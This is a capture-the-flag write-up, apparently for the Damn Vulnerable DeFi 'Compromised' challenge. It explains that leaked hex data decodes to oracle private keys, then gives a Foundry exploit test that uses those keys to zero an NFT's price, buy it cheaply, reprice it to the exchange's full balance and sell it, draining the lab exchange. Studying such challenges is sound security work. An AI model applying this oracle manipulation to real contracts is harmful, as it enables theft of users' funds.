## Compromised solution

The strange response from a web service we got is actually a leaked private key data. Once we decode the hex data to get actual private keys, we can manipulate the prices of NFTs via `postPrice` function in `TrustfulOracle` contract. All we need to do is to set the prices to zero, buy an NFT for extremely low price like 0.1 ether, update the prices to exchange balance and sell our NFT, draining the exchange.

```
    function testExploit() public {
        address exploitedOracle1 = vm.addr(
            0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
        );
        address exploitedOracle2 = vm.addr(
            0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
        );

        vm.prank(address(exploitedOracle1));
        trustfulOracle.postPrice("DVNFT", 0);

        vm.prank(address(exploitedOracle2));
        trustfulOracle.postPrice("DVNFT", 0);

        vm.prank(attacker);
        exchange.buyOne{value: 0.1 ether}();

        vm.prank(address(exploitedOracle1));
        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);

        vm.prank(address(exploitedOracle2));
        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);

        vm.startPrank(attacker);
        nft.approve(address(exchange), 0);
        exchange.sellOne(0);
        vm.stopPrank();

        vm.prank(address(exploitedOracle1));
        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);

        vm.prank(address(exploitedOracle2));
        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        validation();
    }
```